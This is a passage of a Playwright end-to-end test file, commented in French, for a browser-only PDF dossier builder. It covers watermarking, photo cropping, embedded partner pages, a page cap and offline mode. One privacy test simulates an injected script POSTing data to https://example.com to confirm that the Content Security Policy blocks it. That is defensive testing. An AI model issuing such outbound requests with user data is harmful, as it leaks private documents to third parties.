      expect(await page.evaluate(() => Object.keys(localStorage).sort())).toEqual(expect.arrayContaining(["dossierSizeMb"]));
    },
    120_000
  );
});

describe("dossier : options communes aux autres outils", () => {
  test(
    "« Ajouter aussi un filigrane » : décoché par défaut ; coché, chaque page le porte",
    async () => {
      const page = await openPage("/en/dossier");
      await addFiles(page, [pdf("blank.pdf", await makePdf([[595, 842]]))]);
      await waitPages(page, 1);
      const option = page.getByRole("checkbox", { name: en.sign.withWatermark, exact: true });
      expect(await option.isChecked()).toBe(false);
      const redShare = (bytes: Uint8Array) =>
        page.evaluate(async (b64) => {
          const data = Uint8Array.from(atob(b64), (c) => c.charCodeAt(0));
          const bmp = await createImageBitmap(new Blob([data]));
          const c = document.createElement("canvas");
          c.width = bmp.width;
          c.height = bmp.height;
          const ctx = c.getContext("2d")!;
          ctx.drawImage(bmp, 0, 0);
          const px = ctx.getImageData(0, 0, c.width, c.height).data;
          let red = 0;
          for (let i = 0; i < px.length; i += 4) if (px[i] > px[i + 1] + 30 && px[i] > px[i + 2] + 30) red++;
          return red;
        }, Buffer.from(bytes).toString("base64"));
      const clean = await download(page, d.download);
      expect(await redShare(await pageJpeg(clean.bytes, 0))).toBe(0);
      // Verrou par mot de passe : décoché par défaut, le destinataire doit pouvoir ouvrir le fichier.
      expect(await page.getByRole("checkbox", { name: en.filePassword.lock }).isChecked()).toBe(false);

      await option.check();
      await page.getByLabel(en.purpose.label).fill("Rental application");
      await page.getByRole("button", { name: en.tools.adjust, exact: true }).waitFor();
      await waitPages(page, 1);
      const marked = await download(page, d.download);
      expect(await redShare(await pageJpeg(marked.bytes, 0))).toBeGreaterThan(200);
      expect((await scanPdfForLeaks(marked.bytes)).keys).toEqual([]);
    },
    180_000
  );

  test(
    "« Préparer un autre dossier » remet tout à zéro : documents, pages, sections",
    async () => {
      const page = await openPage("/en/dossier");
      await addFiles(page, [pdf("a.pdf", await makeColourPdf([RED, GREEN]))]);
      await waitPages(page, 2);
      await page.getByRole("checkbox", { name: d.sections.split, exact: true }).check();
      await download(page, d.download);
      await page.getByRole("button", { name: d.another, exact: true }).click();
      await page.getByText(en.dropTitle).waitFor();
      await addFiles(page, [pdf("b.pdf", await makeColourPdf([BLUE]))]);
      await waitPages(page, 1);
      expect(await page.getByRole("checkbox", { name: d.sections.split, exact: true }).isChecked()).toBe(false);
      expect(await order(page)).toEqual(["b.pdf#0"]);
    },
    120_000
  );
});

describe("dossier : photo d'une feuille", () => {
  // docs/prd-dossier.md §7 : le choix « Noir et blanc » est une préférence d'affichage, gardée d'une visite à l'autre.
  test(
    "« Noir et blanc » : le dernier choix appliqué est proposé d'office pour la photo suivante, et à la visite suivante",
    async () => {
      const page = await openPage("/en/dossier");
      const openEditor = async (index: number) => {
        await tile(page, index).getByRole("button", { name: d.grid.menu(index + 1), exact: true }).click();
        await page.getByRole("dialog", { name: d.grid.menu(index + 1) }).getByRole("button", { name: d.photo.fix, exact: true }).click();
        const editor = page.getByTestId("photo-fix");
        await editor.getByRole("button", { name: d.photo.corner(1), exact: true }).waitFor();
        return editor;
      };
      await addFiles(page, [png("one.png", makePhotoPng(800, 600, 21)), png("two.png", makePhotoPng(800, 600, 22))]);
      await waitPages(page, 2);
      expect(await page.evaluate(() => localStorage.getItem("dossierGray"))).toBeNull();
      let editor = await openEditor(0);
      const gray = () => editor.getByRole("checkbox", { name: d.photo.gray, exact: true });
      expect(await gray().isChecked()).toBe(false);
      await gray().check();
      await editor.getByRole("button", { name: d.photo.apply, exact: true }).click();
      await editor.waitFor({ state: "detached" });
      expect(await page.evaluate(() => localStorage.getItem("dossierGray"))).toBe("1");

      // L'autre photo : la case part cochée, mais rien n'est appliqué sans « Appliquer ».
      editor = await openEditor(1);
      expect(await gray().isChecked()).toBe(true);
      expect(await editor.getByRole("checkbox", { name: d.photo.whiten, exact: true }).isChecked()).toBe(false);
      await editor.getByRole("button", { name: en.mask.cancel, exact: true }).click();
      await editor.waitFor({ state: "detached" });
      await waitPages(page, 2);
      const file = await download(page, d.download);
      const spread = async (index: number) => {
        const mean = await centreColour(page, await pageJpeg(file.bytes, index));
        return Math.max(...mean) - Math.min(...mean);
      };
      expect(await spread(0)).toBeLessThan(4);
      expect(await spread(1)).toBeGreaterThan(10);

      // Visite suivante : la préférence est relue. Décochée puis appliquée, elle est mise à jour.
      await page.goto(`${E2E_ORIGIN}/en/dossier`);
      await addFiles(page, [png("three.png", makePhotoPng(800, 600, 23))]);
      await waitPages(page, 1);
      editor = await openEditor(0);
      expect(await gray().isChecked()).toBe(true);
      await gray().uncheck();
      await editor.getByRole("button", { name: d.photo.apply, exact: true }).click();
      await editor.waitFor({ state: "detached" });
      expect(await page.evaluate(() => localStorage.getItem("dossierGray"))).toBe("0");
    },
    180_000
  );

  test(
    "téléphone : éditeur des coins au doigt (avec la loupe) et au clavier, nettoyage, puis la page recadrée dans le fichier",
    async () => {
      const page = await openPage("/en/dossier", { viewport: { width: 390, height: 844 }, hasTouch: true, isMobile: browserName() !== "firefox" });
      await addFiles(page, [png("sheet.png", makePhotoPng(1200, 900, 12))]);
      await page.getByRole("button", { name: d.next.pages, exact: true }).click();
      await waitPages(page, 1);
      await tile(page, 0).getByRole("button", { name: d.grid.menu(1), exact: true }).tap();
      await page.getByRole("dialog", { name: d.grid.menu(1) }).getByRole("button", { name: d.photo.fix, exact: true }).tap();
      const editor = page.getByTestId("photo-fix");
      await editor.waitFor();
      const corner = editor.getByRole("button", { name: d.photo.corner(1), exact: true });
      await corner.waitFor();
      const surface = (await page.getByTestId("photo-fix-surface").boundingBox())!;
      const at = async (index: number) => {
        const box = (await page.getByTestId(`photo-corner-${index}`).boundingBox())!;
        return { x: (box.x + box.width / 2 - surface.x) / surface.width, y: (box.y + box.height / 2 - surface.y) / surface.height };
      };
      // Coins par défaut : à 4 % des bords.
      const start = await at(0);
      expect(start.x).toBeCloseTo(0.04, 1);
      expect(start.y).toBeCloseTo(0.04, 1);

      // Au doigt : la loupe apparaît pendant le déplacement, puis disparaît.
      const fire = (type: string, x: number, y: number) =>
        page.evaluate(
          ({ type, x, y }) => {
            const el = document.querySelector('[data-testid="photo-corner-0"]')!;
            el.dispatchEvent(new PointerEvent(type, { bubbles: true, cancelable: true, pointerId: 9, pointerType: "touch", isPrimary: true, clientX: x, clientY: y, button: 0 }));
          },
          { type, x, y }
        );
      await fire("pointerdown", surface.x + surface.width * 0.04, surface.y + surface.height * 0.04);
      await fire("pointermove", surface.x + surface.width * 0.3, surface.y + surface.height * 0.25);
      await page.getByTestId("photo-loupe").waitFor();
      await fire("pointerup", surface.x + surface.width * 0.3, surface.y + surface.height * 0.25);
      await page.getByTestId("photo-loupe").waitFor({ state: "detached" });
      const moved = await at(0);
      expect(moved.x).toBeCloseTo(0.3, 1);
      expect(moved.y).toBeCloseTo(0.25, 1);

      // Au clavier : flèches par pas de 0,5 %, Maj + flèches par pas de 2 %.
      await page.getByTestId("photo-corner-2").focus();
      const before = await at(2);
      await page.keyboard.press("ArrowLeft");
      await page.keyboard.press("Shift+ArrowUp");
      const after = await at(2);
      expect(before.x - after.x).toBeCloseTo(0.005, 2);
      expect(before.y - after.y).toBeCloseTo(0.02, 2);

      await editor.getByRole("checkbox", { name: d.photo.whiten, exact: true }).check();
      await editor.getByRole("checkbox", { name: d.photo.gray, exact: true }).check();
      await editor.getByRole("button", { name: d.photo.apply, exact: true }).tap();
      await editor.waitFor({ state: "detached" });
      await waitPages(page, 1);

      await page.getByRole("button", { name: d.next.check, exact: true }).click();
      const file = await download(page, d.download);
      const jpeg = await pageJpeg(file.bytes, 0);
      // Noir et blanc : plus aucune couleur.
      const mean = await centreColour(page, jpeg);
      expect(Math.max(...mean) - Math.min(...mean)).toBeLessThan(4);
      // Recadrée : la page n'a plus les proportions de la photo (4 / 3).
      const size = imageSize(jpeg)!;
      expect(Math.abs(size.width / size.height - 4 / 3)).toBeGreaterThan(0.05);
    },
    180_000
  );
});

describe("dossier : page intégrée des partenaires", () => {
  const nav = SITE_COPY.en.nav;
  const p = PARTNERS_COPY.en;

  test(
    "#tools=dossier&size=5&sections=… : l'outil seul, 5 Mo présélectionné, sections déjà nommées",
    async () => {
      const page = await openPage(`/embed/en#tools=dossier&size=5&sections=${encodeURIComponent("ID,Payslips,Tax notice")}`);
      await page.locator(`input[aria-label="${d.inputAria}"]`).waitFor({ state: "attached" });
      expect(await page.getByRole("group", { name: p.embed.switchLabel }).count()).toBe(0);
      await addFiles(page, [pdf("a.pdf", await makeColourPdf([RED, GREEN]))]);
      await waitPages(page, 2);
      expect(await sizeRadio(page, en.size.mb(5)).getAttribute("aria-checked")).toBe("true");
      const names = await page.getByTestId("section-header").locator("input").evaluateAll((els) => els.map((el) => (el as HTMLInputElement).value));
      expect(names).toEqual(["ID", "Payslips", "Tax notice"]);
      // Les pages arrivent dans la première section ; les autres attendent, vides.
      expect(await page.getByText(d.sections.empty, { exact: true }).count()).toBe(2);
      const file = await download(page, d.download);
      expect(file.name).toBe("ID.pdf");
      expect(offOrigin()).toEqual([]);
    },
    120_000
  );

  test(
    "trois outils : sélecteur, et confirmation avant de changer d'outil quand des pages sont déposées",
    async () => {
      const page = await openPage("/embed/en#tools=watermark,sign,dossier");
      const group = page.getByRole("group", { name: p.embed.switchLabel });
      // Les outils sont lus dans le fragment après le montage.
      await group.getByRole("button").first().waitFor();
      expect(await group.getByRole("button").allTextContents()).toEqual([nav.tool, nav.sign, nav.dossier]);
      await group.getByRole("button", { name: nav.dossier, exact: true }).click();
      await addFiles(page, [pdf("a.pdf", await makeColourPdf([RED, GREEN]))]);
      await waitPages(page, 2);
      await tile(page, 0).getByRole("button", { name: `${d.grid.rotate} 1`, exact: true }).click();
      await group.getByRole("button", { name: nav.tool, exact: true }).click();
      await page.getByText(p.embed.switchWarn).waitFor();
      await page.getByRole("button", { name: p.embed.switchCancel, exact: true }).click();
      // Annulé : les pages et leur rotation sont toujours là.
      expect(await tile(page, 0).getAttribute("data-rotate")).toBe("90");
      await group.getByRole("button", { name: nav.tool, exact: true }).click();
      await page.getByRole("button", { name: p.embed.switchConfirm, exact: true }).click();
      await page.locator(`input[aria-label="${en.inputAria}"]`).waitFor({ state: "attached" });
    },
    120_000
  );

  test(
    "page partenaires : l'outil Dossier, la taille et les sections passent dans le code à copier",
    async () => {
      const page = await openPage("/en/partners");
      await page.getByLabel(p.options.tools).selectOption({ label: p.options.toolChoices.dossier });
      await page.getByLabel(p.options.size).fill("5");
      await page.getByLabel(p.options.sections).fill("ID, Payslips");
      const code = await page.locator("pre code").first().textContent();
      expect(code).toContain("#tools=dossier&size=5&sections=ID,Payslips");
      await page.getByLabel(p.options.tools).selectOption({ label: p.options.toolChoices.all });
      expect(await page.locator("pre code").first().textContent()).toContain("#tools=watermark,sign,dossier");
    },
    60_000
  );
});

// Promesse « zéro transfert » sur les pages Dossier, sous les en-têtes de
// production (le serveur e2e rejoue out/_headers) : docs/security.md §4.1.
describe("dossier : aucun octet ne quitte le navigateur", () => {
  test(
    "/fr/dossier et /en/dossier : une CSP en en-tête et une en <meta>, parcours complet sans requête hors origine ni violation, exfiltration bloquée",
    async () => {
      context = await browser.newContext({ serviceWorkers: "block", viewport: { width: 1440, height: 1000 } });
      await context.addInitScript(MAP_UPSERT_POLYFILL);
      await context.addInitScript(() => {
        (window as any).__csp = [];
        document.addEventListener("securitypolicyviolation", (e) => (window as any).__csp.push(`${e.violatedDirective} ${e.blockedURI}`));
      });
      requests = [];
      context.on("request", (r) => requests.push(r.url()));
      const page = await context.newPage();

      for (const path of ["/fr/dossier", "/en/dossier"]) {
        const response = await page.goto(`${E2E_ORIGIN}${path}`);
        const header = response?.headers()["content-security-policy"] ?? "";
        expect(header).toContain("connect-src 'self'");
        expect(header).toContain("form-action 'none'");
        // Une seule politique en en-tête (deux règles jointes se liraient « …, default-src … »).
        expect(header).not.toContain(", default-src");
        const metas = page.locator('meta[http-equiv="Content-Security-Policy"]');
        expect(await metas.count()).toBe(1);
        expect(await metas.getAttribute("content")).toContain("connect-src 'self'");
      }

      await addFiles(page, await threeFiles());
      await waitPages(page, 5);
      await dragTile(page, 4, 0, "before");
      await tile(page, 1).getByRole("button", { name: `${d.grid.rotate} 2`, exact: true }).click();
      await tile(page, 4).getByRole("button", { name: `${d.grid.remove} 5`, exact: true }).click();
      await page.getByRole("checkbox", { name: d.sections.split, exact: true }).check();
      await sizeRadio(page, en.size.mb(2)).click();
      await page.getByRole("checkbox", { name: en.filePassword.lock }).check();
      const file = await download(page, d.download);
      expect(file.bytes.length).toBeGreaterThan(1000);
      await page.getByTestId("fingerprint").waitFor();

      expect(offOrigin()).toEqual([]);
      expect(await page.evaluate(() => (window as any).__csp)).toEqual([]);

      // Un script injecté qui tenterait d'exfiltrer est arrêté par la CSP.
      const exfil = await page.evaluate(async () => {
        try {
          await fetch("https://example.com", { method: "POST", body: "x" });
          return "envoyé";
        } catch {
          return "bloqué";
        }
      });
      expect(exfil).toBe("bloqué");
      await page.waitForFunction(() => (window as any).__csp.length > 0);
      expect((await page.evaluate(() => (window as any).__csp))[0]).toStartWith("connect-src");
      // Rien de sensible dans le stockage local : des préférences d'affichage seulement.
      const stored = await page.evaluate(() => JSON.stringify(Object.entries(localStorage)));
      expect(JSON.parse(stored).map(([key]: [string]) => key)).toEqual(expect.arrayContaining(["dossierOutput", "dossierSizeMb"]));
      // Ni nom de fichier, ni nom de section, ni mot de passe.
      for (const secret of ["a.pdf", "b.pdf", "photo", d.sections.presets[0], file.name]) expect(stored).not.toContain(secret);
      expect(await page.evaluate(() => sessionStorage.length)).toBe(0);
      expect(await page.evaluate(() => document.cookie)).toBe("");
    },
    180_000
  );
});

describe("dossier : plafond de 1 000 pages", () => {
  test(
    "le fichier qui ferait dépasser 1 000 pages est écarté, avec sa raison ; de la place libérée, il revient",
    async () => {
      const blank = (n: number) => makePdf(Array.from({ length: n }, () => [200, 280] as [number, number]));
      const page = await openPage("/en/dossier");
      await addFiles(page, [pdf("one.pdf", await blank(500)), pdf("two.pdf", await blank(490)), pdf("three.pdf", await blank(20))]);
      await page.getByText(en.errors.dossier_too_many_pages).first().waitFor({ timeout: 400_000 });
      await page.getByTestId("page-total").filter({ hasText: d.grid.total(990) }).waitFor({ timeout: 400_000 });
      // Le reste du dossier fonctionne : la grille reste légère malgré 990 pages.
      expect(await page.locator("[data-page-index]").count()).toBeLessThan(80);

      await page.getByRole("button", { name: en.remove("two.pdf"), exact: true }).click();
      await page.getByTestId("page-total").filter({ hasText: d.grid.total(520) }).waitFor({ timeout: 200_000 });
      await page.getByText(en.errors.dossier_too_many_pages).first().waitFor({ state: "detached" });
    },
    900_000
  );
});

// Le test du mode avion, automatisé : page chargée une fois, réseau coupé,
// rechargée depuis le service worker, puis un dossier complet. Chromium
// seulement : c'est là que playwright pilote le service worker de façon fiable.
describe("dossier : mode avion", () => {
  test.skipIf(browserName() !== "chromium")(
    "réseau coupé après le premier chargement : la page se recharge et produit le fichier",
    async () => {
      context = await browser.newContext({ viewport: { width: 1440, height: 1000 } });
      await context.addInitScript(MAP_UPSERT_POLYFILL);
      const page = await context.newPage();
      await page.goto(`${E2E_ORIGIN}/en/dossier`);
      // Le service worker a pris la page en charge et fini son précache (page et moteur PDF compris).
      await page.waitForFunction(
        async () => {
          if (!navigator.serviceWorker.controller) return false;
          const hits = await Promise.all(["/en/dossier", "/pdfjs/pdf.worker.min.mjs"].map((u) => caches.match(u)));
          return hits.every(Boolean);
        },
        undefined,
        { timeout: 60_000 }
      );
      // Laisse le précache finir les fichiers restants (scripts de la page).
      await page.waitForTimeout(1500);

      await context.setOffline(true);
      await page.reload();
      // Le réseau est bien coupé : une adresse du site absente du cache ne répond plus.
      const reachable = await page.evaluate(() => fetch(`/robots.txt?offline=${Date.now()}`).then((r) => r.ok, () => false));
      expect(reachable).toBe(false);
      await addFiles(page, await threeFiles());
      await waitPages(page, 5);
      await dragTile(page, 4, 0, "before");
      await sizeRadio(page, en.size.mb(2)).click();
      const file = await download(page, d.download);
      expect(await pageColours(page, file.bytes)).toEqual(["magenta", "red", "green", "blue", "yellow"]);
      await context.setOffline(false);
    },
    180_000
  );
});
